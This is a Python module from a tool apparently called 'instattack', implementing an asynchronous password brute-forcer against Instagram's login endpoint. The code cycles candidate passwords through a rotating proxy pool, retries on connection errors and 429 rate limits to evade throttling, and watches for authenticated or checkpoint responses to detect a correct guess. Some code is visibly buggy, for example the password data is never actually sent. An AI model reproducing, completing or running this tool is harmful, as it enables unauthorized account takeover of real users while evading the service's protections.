from __future__ import absolute_import

import asyncio
import aiohttp

from instattack import settings
from instattack.exceptions import ResultNotInResponse, InstagramResultError
from instattack.models import InstagramResult, LoginAttemptContext, LoginContext

from .base import RequestHandler


class PasswordHandler(RequestHandler):

    __method__ = 'POST'
    __name__ = 'Password Handler'

    def __init__(
        self,
        results,
        proxy_handler,
        session_timeout=None,
        connection_limit=None,
        connection_force_close=None,
        connection_limit_per_host=None,
        connection_keepalive_timeout=None,
        **kwargs,
    ):
        super(PasswordHandler, self).__init__(
            connection_limit=connection_limit,
            session_timeout=session_timeout,
            connection_force_close=connection_force_close,
            connection_limit_per_host=connection_limit_per_host,
            connection_keepalive_timeout=connection_keepalive_timeout,
            **kwargs,
        )

        self.results = results
        self.proxy_handler = proxy_handler

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(PasswordHandler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            return await self._get_result_from_response(response, context)

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def prepopulate(self, loop, password_limit=None):
        self.log.info('Prepopulating Passwords')
        for password in self.user.get_new_attempts(limit=password_limit):
            await self.passwords.put(password)

    async def run(self, loop, token, progress=False, password_limit=None):
        """
        A stop event is required since if the results handler notices that we
        found an authenticated result, it needs some way to communicate this to
        the password consumer, since the password consumer will already have
        a series of tasks queued up.

        TODO:
        ----

        If the task_done() callback is not thread safe because of the
        inability to call await self.results.put(result), we might have to go
        back to using asyncio.as_completed() or limited_as_completed():

        for fut in asyncio.as_completed(tasks):
            fut = await fut
            await self.results.put(fut)

        for res in limited_as_completed(task_generator(), self.config.batch_size):
            result = await res
            await self.results.put(result)
        """
        async with self.starting(loop):
            await self.prepopulate(loop, password_limit=password_limit)

            if self.passwords.qsize() == 0:
                self.log.error('No Passwords to Try')
                return

            # progress = OptionalProgressbar(label='Attempting Login',
            #     max_value=self.passwords.qsize())

            def task_done(fut):
                result = fut.result()
                if not result or not result.conclusive:
                    raise InstagramResultError("Result should be valid and conslusive.")

                # TODO: Make sure we do not run into any threading issues with this
                # potentially not being thread safe.
                self.results.put_nowait(result)

                # progress.update()

            tasks = []
            with self.log.start_and_done('Consuming Passwords'):

                async with aiohttp.ClientSession(
                    connector=self._connector,
                    timeout=self._timeout
                ) as session:
                    index = 0
                    while not self.passwords.empty() and not self.auth_result_found.is_set():
                        password = await self.passwords.get()
                        context = LoginContext(index=index, token=token, password=password)

                        task = asyncio.create_task(self.fetch(session, context))
                        task.add_done_callback(task_done)
                        tasks.append(task)

                    self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
                    await asyncio.gather(*tasks)

            # progress.finish()

    async def stop(self, loop):
        async with self.stopping(loop):
            # Triggered by results handler if it notices an authenticated result.
            # Note that we can also just check `if self.stopped`.
            if self.stop_event.is_set():
                # Here we might want to cancel outstanding tasks that we are awaiting.

                # Proxy handler will stop on it's own if the limit of proxies
                # has been reached, however we want to make sure to stop it
                # if we found an authenticated result.
                await self.proxy_handler.stop(loop)

            # Triggered by No More Passwords - No Authenticated Result
            else:
                # Stop Results Consumer
                await self.results.put(None)

    async def fetch(self, session, parent_context):
        """
        TODO:
        -----
        We NEED TO incorporate updating the proxy models better to reflect errors
        and things of that nature.
        """
        async def try_with_proxy(attempt=0):
            proxy = await self.proxy_handler.get()
            context = LoginAttemptContext(
                index=attempt,
                proxy=proxy,
                parent_index=parent_context.index,
                password=parent_context.password,
                token=parent_context.token
            )
            self._notify_request(context, retry=attempt)

            try:
                async with session.post(
                    settings.INSTAGRAM_LOGIN_URL,
                    headers=self._headers(context.token),
                    proxy=proxy.url(),
                ) as response:
                    # Only reason to log these errors here is to provide the response
                    # object
                    try:
                        result = await self._handle_client_response(response, context)
                        result = await self._handle_parsed_result(result, context)

                    except ResultNotInResponse as e:
                        # TODO: Add error to proxy.
                        proxy.update_time()
                        proxy.num_requests += 1

                        # TODO: Kick the pool.put() method in a call_soon loop operation.
                        self.proxy_handler.pool.put(proxy)
                        self.log.error(e, extra={'response': response, 'context': context})

                    except InstagramResultError as e:
                        # TODO: Add error to proxy.
                        proxy.update_time()
                        proxy.num_requests += 1

                        # TODO: Kick the pool.put() method in a call_soon loop operation.

                        # IMPORTANT!!!!

                        # We have to make sure that if we remove proxies from the pool,
                        # certain proxies cannot be added from broker again because they are so bad.
                        await self.proxy_handler.pool.put(proxy)
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise InstagramResultError("Result should not be None here.")

                        # TODO: Note success of proxy.
                        proxy.update_time()
                        proxy.num_requests += 1

                        # TODO: Kick the pool.put() method in a call_soon loop operation.
                        await self.proxy_handler.pool.put(proxy)
                        await self.proxy_handler.pool.put(proxy)
                        return result

            except RuntimeError as e:
                """
                RuntimeError: File descriptor 87 is used by transport
                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
                """
                # TODO: Add error to proxy.
                proxy.update_time()
                proxy.num_requests += 1

                # TODO: Kick the pool.put() method in a call_soon loop operation.
                await self.proxy_handler.pool.put(proxy)

                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                # TODO: Add error to proxy.
                proxy.update_time()
                proxy.num_requests += 1

                # TODO: Kick the pool.put() method in a call_soon loop operation.
                await self.proxy_handler.pool.put(proxy)

                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.TimeoutError as e:
                # TODO: Add error to proxy - probably want to make sure we don't
                # use it again.
                proxy.update_time()
                proxy.num_requests += 1

                # TODO: Kick the pool.put() method in a call_soon loop operation.
                await self.proxy_handler.pool.put(proxy)

                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientConnectionError as e:
                # TODO: Add error to proxy - probably want to make sure we don't
                # use it again.
                proxy.update_time()
                proxy.num_requests += 1

                # TODO: Kick the pool.put() method in a call_soon loop operation.
                await self.proxy_handler.pool.put(proxy)

                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except OSError as e:
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files -> Want to sleep
                # >>> OSError: [Errno 54] Connection reset by peer
                if e.errno == 54:
                    self.log.error(e, extra={'context': context})
                    return await try_with_proxy(attempt=attempt + 1)
                elif e.errno == 24:
                    asyncio.sleep(3)
                    self.log.error(e, extra={
                        'context': context,
                        'other': f'Sleeping for {3} seconds...'
                    })
                    return await try_with_proxy(attempt=attempt + 1)
                else:
                    raise e

            except asyncio.CancelledError as e:
                # TODO: Kick the pool.put() method in a call_soon loop operation.
                # Do we want to do this?
                await self.proxy_handler.pool.put(proxy)
                pass

            except aiohttp.ClientError as e:
                # For whatever reason these errors don't have any message...
                if e.status == 429:
                    e.message = 'Too many requests.'
                    # TODO: Add error to proxy - probably want to make sure we note
                    # that it was due to a num_requests error.
                    proxy.update_time()
                    proxy.num_requests += 1

                    # TODO: Kick the pool.put() method in a call_soon loop operation.
                    await self.proxy_handler.pool.put(proxy)

                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()
